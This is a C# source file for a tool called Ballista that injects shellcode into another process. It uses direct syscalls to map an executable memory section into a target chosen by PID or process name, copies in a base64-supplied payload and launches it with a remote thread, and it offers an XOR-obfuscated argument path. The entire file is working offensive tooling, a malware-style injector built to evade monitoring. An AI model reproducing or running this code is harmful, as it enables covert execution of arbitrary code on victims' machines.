using System;
using System.Runtime.InteropServices;

using static Ballista.Native;
using static Ballista.Syscalls;
using static Ballista.Releases;

namespace Ballista
{
    public class Ballista
    {
        private static string XOR(string text, string key)
        {
            var result = new System.Text.StringBuilder();

            for (int c = 0; c < text.Length; c++)
                result.Append((char)((uint)text[c] ^ (uint)key[c % key.Length]));

            return result.ToString();
        }

        static void __Shoot(string[] args)
        {
            if (
                args.Length == 3 && Int32.TryParse(args[0], out int release) &&
                release >= 1 && release <= syscallOffsets.Count
                )
            {

                UInt32 size        = 4096,
                       sectionSize = size;

                IntPtr sectionHandle        = IntPtr.Zero,
                       localSectionAddress  = IntPtr.Zero,
                       remoteSectionAddress = IntPtr.Zero;

                ulong sectionOffset   = 0;

                var currProc          = System.Diagnostics.Process.GetCurrentProcess();
                var currProcHandle    = currProc.Handle;
                var currProcSessionId = currProc.SessionId;
                
                NtCreateSection(release, ref sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, IntPtr.Zero, ref sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
                NtMapViewOfSection(release, sectionHandle, currProcHandle, ref localSectionAddress, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out size, 2, (uint)0, PAGE_READWRITE);
                if (localSectionAddress != IntPtr.Zero)
                {
                    int tPid = -1;

                    if (Int32.TryParse(args[1], out int _pid))    //If parsing fails user provided a string (process name instead of a PID)
                        tPid = _pid;
                    else {
                        var processes = System.Diagnostics.Process.GetProcessesByName(args[1].Replace(".exe", string.Empty)); //Strip .exe if it's in the process name

                        if (processes.Length >= 1)
                        {
                            foreach(System.Diagnostics.Process proc in processes)
                            {
                                if(proc.SessionId == currProcSessionId)
                                {
                                    tPid = proc.Id;
                                    break;
                                }
                            }
                        }
                    }

                    if (tPid >= 0)
                    {
                        var tClientId           = new CLIENT_ID();
                        tClientId.UniqueProcess = new IntPtr(tPid);
                        tClientId.UniqueThread  = IntPtr.Zero;

                        var tObjAttr            = new OBJECT_ATTRIBUTES();

                        IntPtr tHandle          = IntPtr.Zero;
                        if (NtOpenProcess(release, ref tHandle, GENERIC_WRITE, ref tObjAttr, ref tClientId) == NTSTATUS.Success)
                        {
                            NtMapViewOfSection(release, sectionHandle, tHandle, ref remoteSectionAddress, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out size, 2, (uint)0, PAGE_EXECUTE_READ);

                            byte[] b64 = Convert.FromBase64String(args[2]);
                            Marshal.Copy(b64, 0, localSectionAddress, b64.Length);

                            IntPtr targetThreadHandle = IntPtr.Zero;
                            NtCreateThreadEx(release, ref targetThreadHandle, GENERIC_WRITE, IntPtr.Zero, tHandle, remoteSectionAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
                        }
                        else
                            Console.WriteLine("\nFailed to open target process.");
                    }
                    else
                        Console.WriteLine("\nNo such process exists for the current user.");
                }
                else
                    Console.WriteLine("\nFailed, most probably due to invalid release.");
            }
            else
                Console.WriteLine("\nArg error.");
        }

        public static void Shoot(string arg, string key)
        {
            __Shoot(XOR(System.Text.Encoding.Default.GetString(Convert.FromBase64String(arg)), key).Split(';'));
        }

        static void Main(string[] args)
        {
            __Shoot(args);
        }
    }
}
